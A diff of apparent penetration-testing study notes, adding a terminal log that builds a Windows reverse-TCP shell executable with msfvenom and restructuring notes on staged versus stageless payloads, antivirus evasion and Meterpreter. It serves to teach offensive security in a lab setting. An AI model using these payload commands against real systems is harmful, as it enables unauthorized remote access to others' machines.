@@ -400,30 +400,51 @@ msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> 
 * `LPORT=<port>`specifies port on the local machine to connect back to.
   * This can be anything between 0 and 65535 that is not already in use.
   * Ports below 1024 are restricted and require a listener running with `root` privileges.
+```
+muri@augury:~$ msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=10.11.12.223 LPORT=443
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 510 bytes
+Final size of exe file: 7168 bytes
+Saved as: shell.exe
+```
 
 ## Staged vs Stageless Payloads
 ### Staged
-* These payloads are sent in two parts.
-* The first part is called the stager.
-* This is a piece of code which is executed directly on the server itself.
-* It connects back to a waiting listener, but doesn't actually contain any reverse shell code by itself.
-* Instead it connects to the listener and uses the connection to load the real payload, executing it directly and preventing it from touching the disk where it could be caught by traditional anti-virus solutions.
-* Thus the payload is split into two parts -- a small initial stager, then the bulkier reverse shell code which is downloaded when the stager is activated.
-* Staged payloads require a special listener -- usually the Metasploit multi/handler.
-* Staged payloads are harder to use, but the initial stager is a lot shorter, and is sometimes missed by less-effective antivirus software.
-* Modern day antivirus solutions will also make use of the Anti-Malware Scan Interface (AMSI) to detect the payload as it is loaded into memory by the stager, making staged payloads less effective than they would once have been in this area.
+* Payloads are sent in two parts.
+* First part is called the *stager*.
+  * Piece of code executed directly on the server itself.
+    * Code connects back to waiting listener.
+    * Connects to the listener and uses the connection to load the real payload.
+      * Real payload is executed directly.
+      * Prevents it from touching the disk where it could be caught by traditional anti-virus solutions.
+* Payload is split into two parts.
+  * Small initial stager.
+  * Bulkier reverse shell code that is downloaded when the stager is activated.
+* Requires a special listener.
+  * Usually Metasploit multi/handler.
+* Harder to use than stageless.
+* Initial stager is a lot shorter.
+* Is sometimes missed by less-effective antivirus software.
+* Modern day antivirus solutions will make use of the Anti-Malware Scan Interface (AMSI) to detect the payload as it is loaded into memory by the stager.
+  * Makes staged payloads less effective than they would once have been in this area.
 
 ### Stageless 
-* These payloads are more common and what we've been using up until now.
-* They are entirely self-contained in that there is one piece of code which, when executed, sends a shell back immediately to the waiting listener.
-* Stageless payloads tend to be easier to use and catch; however, they are also bulkier, and are easier for an antivirus or intrusion detection program to discover and remove.
+* More common than staged.
+* Entirely self-contained.
+  * One piece of code that sends a shell back immediately to the waiting listener when executed.
+* Tend to be easier to use and catch than staged.
+* Bulkier than staged.
+* Easier for an antivirus or intrusion detection program to discover and remove.
 
 ## Meterpreter Shell
-* Meterpreter shells are Metasploit's own brand of fully-featured shell.
-* They are completely stable, making them a very good thing when working with Windows targets.
-* They also have a lot of inbuilt functionality of their own, such as file uploads and downloads.
-* If we want to use any of Metasploit's post-exploitation tools then we need to use a meterpreter shell.
-* The downside to meterpreter shells is that they must be caught in Metasploit.
+* Metasploit's own brand of fully-featured shell.
+* Completely stable.
+  * Very good when working with Windows targets.
+* Inbuilt functionality such as file uploads and downloads.
+* Need to use a meterpreter shell to use any of Metasploit's post-exploitation tools.
+* Meterpreter shells must be caught in Metasploit.
 
 ## Payload Naming Conventions
 * When working with msfvenom, it's important to understand how the naming system works.
